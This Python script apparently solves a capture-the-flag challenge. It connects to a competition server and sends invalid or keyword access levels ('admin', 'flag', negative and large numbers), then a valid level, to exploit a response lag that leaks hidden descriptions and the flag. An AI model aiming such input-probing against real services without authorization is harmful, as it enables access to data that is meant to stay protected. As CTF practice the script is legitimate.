#!/usr/bin/env python3
import socket
import time

def hunt_for_flag():
    """Use the lag behavior to hunt for the flag"""
    
    # Theory: There might be a special level (0, 7, 8, etc.) that contains the flag
    # We can access it by using the lag - send that level, then any other level
    # to see the description of the special level
    
    special_levels_to_test = [
        0, 7, 8, 9, 10, -1, -2, 99, 100, 255, 256, 1000,
        "admin", "flag", "root", "boss", "secret", "hidden"
    ]
    
    for special_level in special_levels_to_test:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            print(f"=== TESTING SPECIAL LEVEL: {special_level} ===")
            sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
            
            # Skip banner
            sock.recv(4096)
            
            # Send the special level
            print(f"Step 1: Sending special level {special_level}")
            sock.send(f"{special_level}\n".encode('utf-8'))
            
            # Get response (should be prompt again)
            response1 = sock.recv(4096)
            print(f"Response 1: {repr(response1.decode('utf-8', errors='replace'))}")
            
            # Now send a normal level to trigger the lag and see the special level's description
            print(f"Step 2: Sending level 1 to trigger lag")
            sock.send("1\n".encode('utf-8'))
            
            # Get the lag response (should show special level's description)
            response2 = sock.recv(4096)
            decoded = response2.decode('utf-8', errors='replace')
            print(f"Response 2 (lag): {repr(decoded)}")
            
            # Check if this contains a flag
            if ('uscc{' in decoded.lower() or 'flag{' in decoded.lower() or 
                ('{' in decoded and '}' in decoded)):
                print(f"*** POTENTIAL FLAG FOUND: {decoded} ***")
                return decoded
            
            # Check if it's different from normal level descriptions
            normal_descriptions = [
                "SCAVENGER — Yard floor access",
                "HAULER — Broken-but-usable stock", 
                "MECHANIC — Engine bays & bins",
                "QUARRY FOREMAN — Heavy salvage ops",
                "YARD MANAGER — Central yard systems",
                "BOSS — Secure compound & vaults"
            ]
            
            if decoded.strip() and decoded.strip() not in normal_descriptions and "Enter access band" not in decoded:
                print(f"*** UNUSUAL DESCRIPTION FOR LEVEL {special_level}: {decoded} ***")
                
                # This might be the flag or contain the flag
                if len(decoded.strip()) > 10:  # Substantial content
                    return decoded
            
            sock.close()
            
        except Exception as e:
            print(f"Error testing special level {special_level}: {e}")
    
    return None

def test_all_combinations():
    """Test combinations of levels to see if any reveal flags"""
    
    # Test all possible first->second combinations where first might be special
    test_combinations = []
    
    # Test negative numbers
    for first in [-5, -4, -3, -2, -1, 0]:
        for second in [1, 2, 3, 4, 5, 6]:
            test_combinations.append((first, second))
    
    # Test high numbers  
    for first in [7, 8, 9, 10, 99, 255]:
        for second in [1, 2, 3, 4, 5, 6]:
            test_combinations.append((first, second))
    
    print(f"Testing {len(test_combinations)} combinations...")
    
    for first, second in test_combinations:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
            sock.recv(4096)  # Skip banner
            
            # Send first level
            sock.send(f"{first}\n".encode('utf-8'))
            sock.recv(4096)  # Skip response
            
            # Send second level to trigger lag
            sock.send(f"{second}\n".encode('utf-8'))
            response = sock.recv(4096)
            
            decoded = response.decode('utf-8', errors='replace')
            
            # Check for flag patterns
            if ('uscc{' in decoded.lower() or 'flag{' in decoded.lower() or 
                ('{' in decoded and '}' in decoded and len(decoded.strip()) > 15)):
                print(f"*** FLAG FOUND WITH COMBINATION {first}->{second}: {decoded} ***")
                return decoded
            
            # Check for unusual responses
            normal_responses = [
                "SCAVENGER — Yard floor access\n",
                "HAULER — Broken-but-usable stock\n", 
                "MECHANIC — Engine bays & bins\n",
                "QUARRY FOREMAN — Heavy salvage ops\n",
                "YARD MANAGER — Central yard systems\n",
                "BOSS — Secure compound & vaults\n",
                "\nEnter access band (1-6): ",
                ""
            ]
            
            if decoded not in normal_responses and len(decoded.strip()) > 5:
                print(f"Unusual response for {first}->{second}: {repr(decoded)}")
            
            sock.close()
            
        except Exception as e:
            # Skip connection errors for invalid combinations
            pass
    
    return None

if __name__ == "__main__":
    print("=== HUNTING FOR FLAG USING LAG BEHAVIOR ===")
    
    result = hunt_for_flag()
    
    if not result:
        print("\n=== TESTING ALL COMBINATIONS ===")
        result = test_all_combinations()
    
    if result:
        print(f"\n*** FINAL FLAG: {result} ***")
    else:
        print("\nNo flag found with lag hunting approach.")